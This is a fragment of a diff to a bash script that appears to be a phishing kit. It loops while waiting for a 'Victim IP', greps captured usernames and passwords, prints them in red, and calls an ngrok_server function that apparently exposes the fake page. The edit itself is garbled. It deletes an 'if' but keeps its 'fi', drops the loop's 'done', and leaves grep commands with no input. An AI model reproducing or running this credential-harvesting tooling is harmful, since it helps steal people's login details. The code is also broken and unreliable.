@@ -234,23 +234,20 @@ echo
 while [ true ]; do
 
 
-if [[ -e ".pdg/www/ip.txt" ]]; then
+
 echo -e $red Victim IP Found
 
-account=$(grep -o 'Username:.*' 
+account=$(grep -o 'Username:.*') 
 IFS=$'\n'
-password=$(grep -o 'Pass:.*' 
+password=$(grep -o 'Pass:.*') 
 echo -e $ red "Account : $account"
 echo -e $ red "Password: $password"
 echo -e $ red Press Ctrl + C to Exit
 fi
 sleep 0.75
 
-done
-
 }
 
-
-tools
 dependencies
+tools
 ngrok_server
